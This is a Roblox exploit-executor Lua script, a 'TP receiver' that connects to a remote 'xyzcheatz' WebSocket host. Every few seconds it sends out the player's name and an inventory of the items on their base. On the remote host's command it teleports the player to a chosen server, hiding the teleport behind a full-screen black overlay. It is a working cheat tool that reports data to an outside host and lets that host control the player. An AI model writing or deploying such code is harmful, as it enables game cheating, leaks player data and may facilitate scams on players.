local Players = game:GetService("Players")
local TeleportService = game:GetService("TeleportService")
local HttpService = game:GetService("HttpService")

local LocalPlayer = Players.LocalPlayer
local WS_URL = "wss://tp-websocket.xyzcheatz.workers.dev/ws1"

local connect =
    (WebSocket and WebSocket.connect)
    or (websocket and websocket.connect)
    or (syn and syn.websocket and syn.websocket.connect)

assert(connect, "No WebSocket API found")

local activeBlackGui

local function hideBlackTeleportScreen()
    if activeBlackGui then
        pcall(function()
            activeBlackGui:Destroy()
        end)
        activeBlackGui = nil
    end
end

local function showBlackTeleportScreen()
    hideBlackTeleportScreen()

    local gui = Instance.new("ScreenGui")
    gui.Name = "TPBlackScreen"
    gui.IgnoreGuiInset = true
    gui.ResetOnSpawn = false
    gui.DisplayOrder = 2147483647
    gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

    local black = Instance.new("Frame")
    black.Name = "Black"
    black.Size = UDim2.fromScale(1, 1)
    black.Position = UDim2.fromScale(0, 0)
    black.BackgroundColor3 = Color3.new(0, 0, 0)
    black.BackgroundTransparency = 0
    black.BorderSizePixel = 0
    black.ZIndex = 100
    black.Parent = gui

    local parent
    if gethui then
        local ok, result = pcall(gethui)
        if ok and result then
            parent = result
        end
    end

    parent = parent or LocalPlayer:WaitForChild("PlayerGui")
    gui.Parent = parent
    activeBlackGui = gui

    pcall(function()
        TeleportService:SetTeleportGui(gui:Clone())
    end)

    return gui
end

local OWNER_ATTRS = {
    "Owner",
    "OwnerName",
    "Username",
    "PlayerName",
    "OwnerId",
    "OwnerUserId",
    "UserId"
}

local BRAINROT_ATTRS = {
    "Animal",
    "AnimalName",
    "Brainrot",
    "BrainrotName",
    "__Animal",
    "DisplayName"
}

local MUTATION_ATTRS = {
    "__Mutation",
    "Mutation"
}

local GENERIC_MODEL_NAMES = {
    model = true,
    animal = true,
    brainrot = true,
    rig = true,
    root = true,
    main = true,
    podium = true,
    slot = true,
    holder = true,
    display = true
}

local function trim(value)
    return tostring(value or ""):match("^%s*(.-)%s*$")
end

local function valueMatchesLocalPlayer(value)
    if typeof(value) == "Instance" and value:IsA("Player") then
        return value == LocalPlayer
    end

    if type(value) == "number" then
        return value == LocalPlayer.UserId
    end

    if type(value) == "string" then
        local lower = trim(value):lower()
        return lower == LocalPlayer.Name:lower()
            or lower == LocalPlayer.DisplayName:lower()
            or tonumber(lower) == LocalPlayer.UserId
    end

    return false
end

local function objectNamesLocalPlayer(obj)
    for _, attrName in ipairs(OWNER_ATTRS) do
        if valueMatchesLocalPlayer(obj:GetAttribute(attrName)) then
            return true
        end
    end

    for _, childName in ipairs(OWNER_ATTRS) do
        local child = obj:FindFirstChild(childName)
        if child then
            if child:IsA("StringValue")
                or child:IsA("IntValue")
                or child:IsA("NumberValue")
                or child:IsA("ObjectValue") then
                if valueMatchesLocalPlayer(child.Value) then
                    return true
                end
            end
        end
    end

    if obj:IsA("TextLabel") or obj:IsA("TextButton") then
        local text = tostring(obj.Text or ""):lower()
        if text:find(LocalPlayer.Name:lower(), 1, true)
            or text:find(LocalPlayer.DisplayName:lower(), 1, true) then
            return true
        end
    end

    return false
end

local function groupBelongsToLocalPlayer(podiums)
    local current = podiums

    -- Check the podium group and several base ancestors first.
    for _ = 1, 7 do
        if not current then
            break
        end

        if objectNamesLocalPlayer(current) then
            return true
        end

        current = current.Parent
    end

    -- Many bases expose the owner on a sign/label next to AnimalPodiums.
    local base = podiums.Parent
    if not base then
        return false
    end

    local checked = 0
    for _, obj in ipairs(base:GetDescendants()) do
        checked += 1
        if checked > 700 then
            break
        end

        if objectNamesLocalPlayer(obj) then
            return true
        end
    end

    return false
end

local function firstAttributeInTree(root, attributeNames)
    for _, attrName in ipairs(attributeNames) do
        local value = root:GetAttribute(attrName)
        if value ~= nil and trim(value) ~= "" then
            return trim(value)
        end
    end

    for _, obj in ipairs(root:GetDescendants()) do
        for _, attrName in ipairs(attributeNames) do
            local value = obj:GetAttribute(attrName)
            if value ~= nil and trim(value) ~= "" then
                return trim(value)
            end
        end
    end

    return nil
end

local function firstStringValueInTree(root, names)
    for _, name in ipairs(names) do
        local obj = root:FindFirstChild(name, true)
        if obj and obj:IsA("StringValue") and trim(obj.Value) ~= "" then
            return trim(obj.Value)
        end
    end

    return nil
end

local function getBrainrotName(slot)
    local name = firstAttributeInTree(slot, BRAINROT_ATTRS)
        or firstStringValueInTree(slot, {
            "Animal",
            "AnimalName",
            "Brainrot",
            "BrainrotName"
        })

    if name and name ~= "" then
        return name
    end

    -- Fallback: choose a non-generic descendant model name.
    for _, obj in ipairs(slot:GetDescendants()) do
        if obj:IsA("Model") then
            local candidate = trim(obj.Name)
            local lower = candidate:lower()

            if candidate ~= ""
                and not GENERIC_MODEL_NAMES[lower]
                and not lower:find("podium", 1, true)
                and not lower:find("slot", 1, true) then
                return candidate
            end
        end
    end

    return nil
end

local function getMutation(slot)
    local mutation = firstAttributeInTree(slot, MUTATION_ATTRS)
        or firstStringValueInTree(slot, MUTATION_ATTRS)

    if not mutation or mutation == "" then
        return nil
    end

    if mutation:lower() == "normal" or mutation:lower() == "none" then
        return nil
    end

    return mutation
end

local function collectOwnBaseItems()
    -- Optional exact override if you already know the game's current base format.
    if getgenv and type(getgenv().TPGetStuff) == "function" then
        local ok, custom = pcall(getgenv().TPGetStuff)
        if ok and type(custom) == "table" then
            return custom
        end
    end

    local rawItems = {}

    for _, obj in ipairs(workspace:GetDescendants()) do
        if obj.Name == "AnimalPodiums" and groupBelongsToLocalPlayer(obj) then
            for _, slot in ipairs(obj:GetChildren()) do
                local brainrotName = getBrainrotName(slot)

                if brainrotName then
                    rawItems[#rawItems + 1] = {
                        name = brainrotName,
                        mutation = getMutation(slot)
                    }
                end
            end

            -- Stop after the receiver's own base is found.
            break
        end
    end

    -- Combine exact duplicates so the sender can see quantities.
    local order = {}
    local counts = {}

    for _, item in ipairs(rawItems) do
        local mutation = item.mutation or ""
        local key = item.name:lower() .. "\0" .. mutation:lower()

        if not counts[key] then
            counts[key] = {
                name = item.name,
                mutation = item.mutation,
                count = 0
            }
            order[#order + 1] = key
        end

        counts[key].count += 1
    end

    local items = {}

    for _, key in ipairs(order) do
        local entry = counts[key]
        local extras = {}

        if entry.mutation then
            extras[#extras + 1] = "Mutation: " .. entry.mutation
        end

        if entry.count > 1 then
            extras[#extras + 1] = "x" .. tostring(entry.count)
        end

        local result = {
            name = entry.name
        }

        if #extras > 0 then
            result.extra = table.concat(extras, " | ")
        end

        items[#items + 1] = result
    end

    return items
end

local ok, ws = pcall(function()
    return connect(WS_URL)
end)

if not ok then
    warn("[TP RECEIVER] Connection failed:", ws)
    return
end

if getgenv then
    getgenv().TPReceiverWS = ws
end

local function send(data)
    local success, err = pcall(function()
        ws:Send(HttpService:JSONEncode(data))
    end)

    if not success then
        warn("[TP RECEIVER] Send failed:", err)
    end
end

local function register(kind)
    send({
        type = kind or "register",
        username = LocalPlayer.Name,
        displayName = LocalPlayer.DisplayName,
        items = collectOwnBaseItems()
    })
end

local function handleMessage(message)
    local success, data = pcall(function()
        return HttpService:JSONDecode(message)
    end)

    if not success or type(data) ~= "table" then
        return
    end

    if data.type == "connected" then
        register("register")
        print("[TP RECEIVER] Ready/registering as", LocalPlayer.Name)
        return
    end

    if data.type == "registered" then
        print("[TP RECEIVER] Registered")
        return
    end

    if data.type ~= "join" then
        return
    end

    if data.target
        and tostring(data.target):lower() ~= LocalPlayer.Name:lower() then
        return
    end

    local placeId = tonumber(data.placeId)
    local jobId = tostring(data.jobId or "")

    if not placeId or jobId == "" then
        warn("[TP RECEIVER] Invalid teleport request")
        return
    end

    showBlackTeleportScreen()
    task.wait()

    local tpOk, tpErr = pcall(function()
        TeleportService:TeleportToPlaceInstance(placeId, jobId, LocalPlayer)
    end)

    if not tpOk then
        hideBlackTeleportScreen()
        warn("[TP RECEIVER] Teleport failed:", tpErr)
    end
end

if ws.OnMessage then
    ws.OnMessage:Connect(handleMessage)
elseif ws.Message then
    ws.Message:Connect(handleMessage)
else
    warn("[TP RECEIVER] No message event found")
end

if ws.OnClose then
    ws.OnClose:Connect(function()
        warn("[TP RECEIVER] WebSocket disconnected")
    end)
end

task.spawn(function()
    while true do
        task.wait(5)
        register("update")
    end
end)
